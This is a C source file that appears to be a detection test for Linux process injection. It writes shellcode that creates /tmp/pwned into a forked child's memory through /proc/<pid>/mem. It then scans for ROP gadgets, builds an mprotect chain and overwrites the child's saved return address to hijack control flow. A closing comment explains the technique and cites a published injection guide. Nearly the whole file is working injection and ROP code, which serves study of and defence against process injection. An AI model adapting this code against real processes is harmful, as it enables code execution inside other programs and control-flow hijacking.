#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <ctype.h>
#include <elf.h>
#include <sys/mman.h>

unsigned char shellcode[] = {
    0x48, 0x83, 0xe4, 0xf0,        // and rsp, -16        (stack alignment)
    0xeb, 0x26,                    // jmp short get_path
    // --- back: ---
    0x5f,                          // pop rdi
    0xb8, 0x02, 0x00, 0x00, 0x00,  // mov rax, 2          (open)
    0xbe, 0x41, 0x00, 0x00, 0x00,  // mov esi, 0x41       (O_CREAT|O_WRONLY)
    0xba, 0xa4, 0x01, 0x00, 0x00,  // mov edx, 0x1a4      (0644)
    0x0f, 0x05,                    // syscall
    0x48, 0x89, 0xc7,              // mov rdi, rax        (fd)
    0xb8, 0x03, 0x00, 0x00, 0x00,  // mov rax, 3          (close)
    0x0f, 0x05,                    // syscall
    0xb8, 0x3c, 0x00, 0x00, 0x00,  // mov rax, 60         (exit)
    0x48, 0x31, 0xff,              // xor rdi, rdi
    0x0f, 0x05,                    // syscall
    // --- get_path: ---
    0xe8, 0xd5, 0xff, 0xff, 0xff,  // call back
    0x2f, 0x74, 0x6d, 0x70, 0x2f,  // "/tmp/"
    0x70, 0x77, 0x6e, 0x65, 0x64,  // "pwned"
    0x00                          
};
unsigned int shellcode_len = sizeof(shellcode);

#define MAX_LOOPS 100
#define CHUNK_SIZE (size_t)sysconf(_SC_PAGESIZE)

typedef struct {
    const uint8_t  *bytes;
    size_t          len;
    uint64_t        addr;
} Gadget;

pid_t create_victim_child_process() {
    pid_t pid = fork();
    if (pid < 0) {
        return 0;
    } else if (pid == 0) {
        sleep(2);
        exit(0);
    }
    usleep(200000);
    return pid;
}

ssize_t write_in_mem(long addr, pid_t pid, unsigned char *buffer, size_t len) {
    char path[256];
    snprintf(path, sizeof(path), "/proc/%d/mem", pid);

    int fd = open(path, O_RDWR);
    if (fd < 0) return -1;

    if (lseek(fd, (off_t)addr, SEEK_SET) == (off_t)-1) {
        close(fd);
        return -2;
    }

    ssize_t ret = write(fd, buffer, len);

    close(fd);
    return ret;
}

int read_mem(void *buf, pid_t pid, uintptr_t address, size_t len) {
    char filepath[256];
    snprintf(filepath, sizeof(filepath), "/proc/%d/mem", pid);

    FILE *file = fopen(filepath, "r");
    if (!file) return -1;

    if (fseeko(file, (off_t)address, SEEK_SET) != 0) {
        fclose(file);
        return -2;
    }

    if (fread(buf, 1, len, file) != len) {
        fclose(file);
        return -3;
    }

    fclose(file);
    return 0;
}

void print_mem(unsigned char* buffer, long size) {
    for (size_t i = 0; i < size; i += 16) {
        printf("%06zx  ", i);
        for (size_t j = 0; j < 16; j++) {
            if (i + j < size)
                printf("%02x ", buffer[i + j]);
            else
                printf("   ");
            if (j == 7) printf(" ");
        }
        printf("\n");
    }
}

long get_reg(pid_t pid, const char* reg) {
    char path[256];
    snprintf(path, sizeof(path), "/proc/%d/syscall", pid);

    char buffer[256];
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;

    //try to read registers until they become available
    ssize_t bytesRead;
    int i=0;
    while (i < MAX_LOOPS && (bytesRead = pread(fd, buffer, sizeof(buffer) - 1, 0)) > 0) {
        if (strncmp(buffer, "running", 7) != 0) break;

        i++;
        usleep(1000); 
    }

    close(fd);
    if (bytesRead <= 0) return -1;
    buffer[bytesRead] = '\0';

    long syscall, rdi, rsi, rdx, r10, r8, r9, rsp, rip;
    int n = sscanf(buffer, "%ld %lx %lx %lx %lx %lx %lx %lx %lx",
                &syscall, &rdi, &rsi, &rdx, &r10, &r8, &r9, &rsp, &rip);

    if (n < 9) return -1;

    if (strcmp(reg, "syscall") == 0) return syscall;
    if (strcmp(reg, "rdi") == 0)     return rdi;
    if (strcmp(reg, "rsi") == 0)     return rsi;
    if (strcmp(reg, "rdx") == 0)     return rdx;
    if (strcmp(reg, "r10") == 0)     return r10;
    if (strcmp(reg, "r8") == 0)      return r8;
    if (strcmp(reg, "r9") == 0)      return r9;
    if (strcmp(reg, "rsp") == 0)     return rsp;
    if (strcmp(reg, "rip") == 0)     return rip;

    return -1;
}

long find_memory_region(long pid, size_t required_len, const char *target_perms) {
    char maps_file_name[64];
    snprintf(maps_file_name, sizeof(maps_file_name), "/proc/%ld/maps", pid);

    FILE *maps_file = fopen(maps_file_name, "r");
    if (maps_file == NULL) return -1;

    char *line = NULL;
    size_t len = 0;
    long found_address = -1;

    while (getline(&line, &len, maps_file) != -1) {
        long start, end;
        char perms[5];
        if (sscanf(line, "%lx-%lx %4s", &start, &end, perms) == 3) {
            
            // has this region all the permissions required?
            int has_all_perms = 1;
            for (int i = 0; target_perms[i] != '\0'; i++) {
                if (strchr(perms, target_perms[i]) == NULL) {
                    has_all_perms = 0;
                    break;
                }
            }
            
            if (has_all_perms) {
                // is this region, with the correct permission, big enough?
                size_t region_size = (size_t)(end - start);
                if (region_size >= required_len) {
                    found_address = start;
                    break;
                }
            }
        }
    }

    free(line);
    fclose(maps_file);
    return found_address;
}

long find_return_address(long pid, long rsp) {
    //read 128 element from the stack -> stack_dump
    uint64_t stack_dump[128]; 
    char mem_path[128];
    snprintf(mem_path, sizeof(mem_path), "/proc/%ld/mem", pid);

    int fd = open(mem_path, O_RDONLY);
    if (fd < 0) return -1;

    ssize_t bytes_read = pread(fd, stack_dump, sizeof(stack_dump), rsp);
    close(fd);
    if (bytes_read <= 0) return -1;
    int num_elements = bytes_read / sizeof(uint64_t);

    // read the memory of the process
    char maps_file_name[128];
    snprintf(maps_file_name, sizeof(maps_file_name), "/proc/%ld/maps", pid);
    char *line = NULL;
    size_t len = 0;
    FILE *maps_file = fopen(maps_file_name, "r");
    if (maps_file == NULL) return -1;

    int best_index = 9999; // Track the index closest to RSP
    long found_ret_addr_location = -1;

    //for every region in the memory ...
    while (getline(&line, &len, maps_file) != -1) {
        long start_addr, end_addr;
        char perms[5];

        //has the scanf read 3 elements? (start_address)-(end_address) (perms) 
        if (sscanf(line, "%lx-%lx %4s", &start_addr, &end_addr, perms) != 3)
            continue;
            
        //has the region execute permission?
        if (strchr(perms, 'x') == NULL)
            continue;
            
        for (int i = 0; i < num_elements && i < best_index; i++) {
            //...for every value in the stack...
            uint64_t candidate_val = stack_dump[i];

            //...does this value point to this region
            if (candidate_val >= (uint64_t)start_addr && candidate_val < (uint64_t)end_addr) {
                best_index = i; // new closest found
                // compute static address
                found_ret_addr_location = rsp + (i * sizeof(uint64_t));
            }
        }
    }
    free(line);
    fclose(maps_file);
    return found_ret_addr_location;
}

long find_gadgets(int pid, Gadget *gadgets, int num_gadgets) {
    char maps_path[256];
    char mem_path[256];
    
    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
    snprintf(mem_path, sizeof(mem_path), "/proc/%d/mem", pid);

    FILE *maps_file = fopen(maps_path, "r");
    int mem_fd = open(mem_path, O_RDONLY);

    if (!maps_file || mem_fd < 0) {
        if (maps_file) fclose(maps_file);
        if (mem_fd >= 0) close(mem_fd);
        return -1;
    }

    size_t max_gadget_len = 0;
    for (int i = 0; i < num_gadgets; i++) {
        if (gadgets[i].len > max_gadget_len) {
            max_gadget_len = gadgets[i].len;
        }
    }
    size_t overlap = max_gadget_len - 1;
    unsigned char *buffer = malloc(CHUNK_SIZE);
    if (!buffer) {
        fclose(maps_file);
        close(mem_fd);
        return -1;
    }

    char line[512];
    long found = 0;

    // read the memory
    while (fgets(line, sizeof(line), maps_file)) {
        long start, end;
        char perms[5];
        
        //has the scanf read 3 elements? (start_address)-(end_address) (perms) 
        if (sscanf(line, "%lx-%lx %4s", &start, &end, perms) != 3)
            continue;
        
        //has the region execute permission?
        if (strchr(perms, 'x') == NULL)
            continue;

        long current_addr = start;
        while (current_addr < end) {
            size_t bytes_to_read = end - current_addr;
            if (bytes_to_read > CHUNK_SIZE) {
                bytes_to_read = CHUNK_SIZE;
            }

            ssize_t bytes_read = pread(mem_fd, buffer, bytes_to_read, current_addr);
            if (bytes_read <= 0) break;

            for (int i = 0; i < num_gadgets; i++) {
                if (gadgets[i].addr != 0) continue;
                
                unsigned char *match = memmem(buffer, bytes_read, gadgets[i].bytes, gadgets[i].len);
                if (match) {
                    gadgets[i].addr = current_addr + (match - buffer);
                    found++;
                }
            }

            if (found == num_gadgets) {
                free(buffer);
                fclose(maps_file);
                close(mem_fd);
                return found;
            }

            if (current_addr + bytes_read < end) {
                current_addr += (bytes_read - overlap);
            } else
                break; 
        }
    }

    free(buffer);
    fclose(maps_file);
    close(mem_fd);
    return found;
}

uint64_t* build_rop_chain(long address, pid_t pid){
    Gadget gadgets[] = {
        { (uint8_t*)"\x5f\xc3",         2, 0 }, // pop rdi; ret
        { (uint8_t*)"\x5e\xc3",         2, 0 }, // pop rsi; ret
        { (uint8_t*)"\x5a\xc3",         2, 0 }, // pop rdx; ret
        { (uint8_t*)"\x58\xc3",         2, 0 }, // pop rax; ret
        { (uint8_t*)"\x0f\x05\xc3",     3, 0 }, // syscall; ret
    };
    int n = sizeof(gadgets) / sizeof(gadgets[0]);

    int found = find_gadgets(pid, gadgets, n);
    if (found < n) {
        fprintf(stderr, "[-] Not all gadgets found (%d/%d)\n", found, n);
        return NULL;
    }

    uint64_t pop_rdi_ret = gadgets[0].addr;
    uint64_t pop_rsi_ret = gadgets[1].addr;
    uint64_t pop_rdx_ret = gadgets[2].addr;
    uint64_t pop_rax_ret = gadgets[3].addr;
    uint64_t syscall_ret = gadgets[4].addr;

    printf("[+] All gadgets found:\n");
    printf("    pop rdi; ret -> 0x%lx\n", pop_rdi_ret);
    printf("    pop rsi; ret -> 0x%lx\n", pop_rsi_ret);
    printf("    pop rdx; ret -> 0x%lx\n", pop_rdx_ret);
    printf("    pop rax; ret -> 0x%lx\n", pop_rax_ret);
    printf("    syscall; ret -> 0x%lx\n", syscall_ret);

    uint64_t *rop_chain = malloc(10 * sizeof(uint64_t));
    if (!rop_chain) return NULL;

    long offset = address % CHUNK_SIZE;          // distance from the start of the page
    long aligned_addr = address - offset;       // address of the page
    long aligned_len = shellcode_len + offset;  // where the payload is gonna end in memory

    rop_chain[0] = pop_rdi_ret;
    rop_chain[1] = aligned_addr;                        // RDI
    rop_chain[2] = pop_rsi_ret;
    rop_chain[3] = aligned_len;                         // RSI
    rop_chain[4] = pop_rdx_ret;
    rop_chain[5] = PROT_READ | PROT_EXEC;               // RDX (r-x: 5)
    rop_chain[6] = pop_rax_ret;
    rop_chain[7] = 10;                                  // RAX (mprotect)
    rop_chain[8] = syscall_ret;                         // executes mprotect
    rop_chain[9] = address;

    return rop_chain;
}


int main(int argc, char *argv[]) { 
    pid_t pid = create_victim_child_process();
    if (pid == 0) {
        fprintf(stderr, "[-] Failed to fork\n");
        exit(1);
    }
    printf("[+] target PID: %d\n", pid);

    //inject the payload to a writable memory region without execution permissions
    long target_address = find_memory_region(pid, shellcode_len, "w");
    if (target_address == -1) {
        fprintf(stderr, "[-] Writable memory region not found\n");
        exit(1);
    }
    printf("[+] Writable memory region found at: 0x%lx\n", target_address);

    unsigned char MemRegion[shellcode_len];
    if (read_mem(MemRegion, pid, target_address, shellcode_len) != 0) 
        fprintf(stderr, "[!] Warning: failed to read memory\n");
    printf("[+] memory region content before the overwrite: \n");
    print_mem(MemRegion, shellcode_len);

    if(write_in_mem(target_address, pid, shellcode, shellcode_len) != (ssize_t)shellcode_len) {
        fprintf(stderr, "[-] Failed to write payload into memory region\n");
        exit(1);
    }
    printf("[+] Payload written successfully\n");

    if (read_mem(MemRegion, pid, target_address, shellcode_len) != 0) 
        fprintf(stderr, "[!] Warning: failed to read memory\n");
    printf("[+] memory region content after the overwrite: \n");
    print_mem(MemRegion, shellcode_len);

    // Construct a ROP chain to call mprotect and mark the memory region of our shellcode executable
    uint64_t *rop_chain = build_rop_chain(target_address, pid);
    if (rop_chain == NULL) {
        fprintf(stderr, "[-] ROP chain construction failed\n");
        exit(1);
    }
    size_t rop_chain_size = 10 * sizeof(uint64_t); //10 gadget in the ROP chain
    printf("[+] ROP chain successfully built\n");

    // gathering rsp, necessary to find the return address
    long rsp = get_reg(pid, "rsp");
    if(rsp == -1) {
        fprintf(stderr, "[-] Stack pointer not found\n");
        exit(1);
    }
    printf("[+] Stack pointer: 0x%lx\n",rsp);

    // gathering return address
    long return_address = find_return_address(pid, rsp); 
    if(return_address == -1) {
        fprintf(stderr, "[-] Return address not found\n");
        exit(1);
    }
    printf("[+] Return address: 0x%lx\n",return_address);

    // Overwrite the return address in the stack with the ROP chain
    ssize_t ret = write_in_mem(return_address, pid, (unsigned char *)rop_chain, rop_chain_size);
    free(rop_chain);
    if(ret != (ssize_t)rop_chain_size) {
        fprintf(stderr, "[-] Failed to overwrite the return address\n");
        exit(1);
    }
    printf("[+] Return address overwritten successfully with the ROP chain\n");

    unsigned char *buffer = malloc(rop_chain_size);
    if (!buffer) {
        fprintf(stderr, "[!] Warning: malloc failed, skipping post-overwrite dump\n");
    } else {
        if (read_mem(buffer, pid, return_address, rop_chain_size) != 0)
            fprintf(stderr, "[!] Warning: failed to read memory of the ROP chain\n");
        printf("[+] Return address location after the overwrite:\n");
        print_mem(buffer, rop_chain_size);
        free(buffer);
    }

    printf("[+] Injection finished\n");
    exit(0); 
}

/**
 * This technique performs control-flow hijacking via Return Address Overwriting.
 * It first identifies a (rw-) memory region by scanning /proc/<pid>/maps
 * and writes the shellcode into it through /proc/<pid>/mem.
 * It then builds the ROP chain to call mprotect to make the payload executable
 * After that it inspects the process stack (from the RSP register) to locate the saved return address.
 * By overwriting this stack location with the address of the code cave,
 * the moment the CPU executes the next RET instruction,
 * execution is redirected into the ROP chain, and from there to the payload.
 * 
 * Compared to the simpler "code cave + return address overwrite" variant,
 * this technique does not require finding an executable code cave:
 * it can write the payload into any writable region (heap, .data)
 * and use a ROP chain to invoke mprotect and grant execution permissions before jumping into it.
 * This is useful when no suitable executable cave is available in the victim's mapping,
 * or in scenarios such as remote exploitation via buffer overflow,
 * where the attacker has control over the stack but not over arbitrary memory writes.
 * 
 * Note: this test forks a child process to use as the injection target.
 * This allows the test to run on systems where ptrace_scope=1 (default on most Linux distributions),
 * where a process can only modify the memory of its own descendants.
 * This may differ from a real-world scenario where the attacker targets an arbitrary process,
 * but for the purpose of this test it preserves the detection-relevant behavior: the same syscalls and /proc/<pid>/mem
 * access patterns are generated regardless of the relationship between injector and target.
 * 
 * Injection inspired by Ori David in "The Definitive Guide to Linux Process Injection"
 * https://www.akamai.com/blog/security-research/the-definitive-guide-to-linux-process-injection
 */
